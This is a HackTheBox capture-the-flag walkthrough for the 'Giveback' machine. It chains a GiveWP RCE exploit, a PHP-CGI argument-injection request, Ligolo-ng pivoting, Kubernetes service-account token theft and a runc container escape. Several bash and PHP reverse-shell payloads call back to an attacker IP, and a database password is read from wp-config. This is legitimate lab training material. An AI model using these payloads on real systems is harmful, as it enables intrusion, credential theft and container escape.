# HackTheBox - Giveback
**Youtube video:** https://youtu.be/du1cABpynLI
---
## Initial Foothold

**WordPress Enumeration:**
```bash
# Scan WordPress installation
wpscan --url http://$IP --enumerate ap,u,t

# Found: GiveWP < 3.14.2 (vulnerable)
```

**Exploit:** CVE-2024-5932 - GiveWP RCE
- **Payload:** https://github.com/EQSTLab/CVE-2024-5932
```bash
# Clone exploit
git clone https://github.com/EQSTLab/CVE-2024-5932.git

# Execute RCE
uv run exploit.py --url http://giveback.htb/donations/the-things-we-need/ --cmd 'bash -c "bash -i >& /dev/tcp/10.10.14.24/4444 0>&1"'
```

---
## Kubernetes Environment Discovery

**Environment Variables:**
```bash
# Check environment
env

# Found legacy intranet service
# LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
```

**Extract Database Credentials:**
```bash
# Check WordPress config
cat /opt/bitnami/wordpress/wp-config.php

# Found credentials:
# DB_USER: bn_wordpress
# DB_PASSWORD: sW5sp4spa3u7RLyetrekE4oS
```

---
## Pivoting with Ligolo-ng

**Setup Ligolo Tunnel:**
```bash
# On attacker machine - create tunnel interface
sudo ip tuntap add user kalimainacc mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# On target - connect agent
./lin_agent -connect 192.168.45.244:11601 -ignore-cert

# Start session
session
start

# Add route to Kubernetes network (from env)
sudo ip route add 10.43.0.0/16 dev ligolo
```

---
## Legacy Intranet Exploitation

**Access Internal Service:**
```bash
# Browse to internal service
http://10.43.2.241:5000/

# Found developer note:
# <!-- Developer note: phpinfo accessible via debug mode during migration window -->

# Access phpinfo
http://10.43.2.241:5000/phpinfo.php?debug=true

# Found: PHP-CGI and PHP 8.3.3 (vulnerable)
```

**Exploit:** CVE-2024-4577 - PHP-CGI Argument Injection
- **Reference:** https://www.exploit-db.com/exploits/52047
```bash
# CGI handler payload
POST /cgi-bin/php-cgi?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: 10.43.2.241:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 73

<?php system('bash -c "bash -i >& /dev/tcp/10.10.14.44/443 0>&1"'); ?>

# Alternative payload in POST body:
php -r '$sock=fsockopen("10.10.14.4",443);exec("/bin/sh <&3 >&3 2>&3");'
```

**Shell as babywyrm**

---
## Kubernetes API Enumeration

**Service Account Discovery:**
```bash
# Check default Kubernetes service account mount
ls -la /var/run/secrets/kubernetes.io/serviceaccount/

# Files found:
# token - JWT for authenticating to K8s API
# ca.crt - cluster CA certificate
# namespace - the pod's namespace
```

**Setup Kubernetes API Access:**
```bash
# Using curl to interact with K8s API
# Reference: https://cloud.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/kubernetes-enumeration.html#using-curl

SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""

# Enumerate secrets
kurl https://10.43.0.1:443/api/v1/namespaces/default/secrets
```

---
## Privilege Escalation (babywyrm → root)

**Sudo Enumeration:**
```bash
sudo -l
# Found: (ALL) /opt/debug

# Check version
sudo /opt/debug version
# runc version 1.1.11 (vulnerable to CVE-2024-21626)
```

**Exploit:** CVE-2024-21626 - runc Container Escape
- **Payload:** https://github.com/strikoder/cve-2024-21626-runc-1.1.11-escape

**Method 1 - Manual rootfs creation:**
```bash
# Create rootfs structure
cd /tmp && mkdir -p strikoder/rootfs && cd strikoder
mkdir rootfs/lib64 && mkdir rootfs/lib
cp -aL /bin rootfs/bin 
cp /lib64/ld-linux-x86-64.so.2 rootfs/lib64/
cp -a /lib/x86_64-linux-gnu rootfs/lib
```

**Method 2 - Docker image extraction:**
```bash
# On attacker machine - create Alpine tarball
docker export $(docker create alpine:latest) > alpine.tar

# On target - extract to rootfs
tar -xvf alpine.tar -C rootfs
```

**Configure and Execute Exploit:**
```bash
# Generate runc spec
runc spec

# Edit config.json - change cwd to /proc/self/fd/7
vi config.json
# Update: "cwd": "/proc/self/fd/7"
# This points into the host instead of the container

# Run container escape
sudo /opt/debug --log /tmp/log.json run strikontainer
```
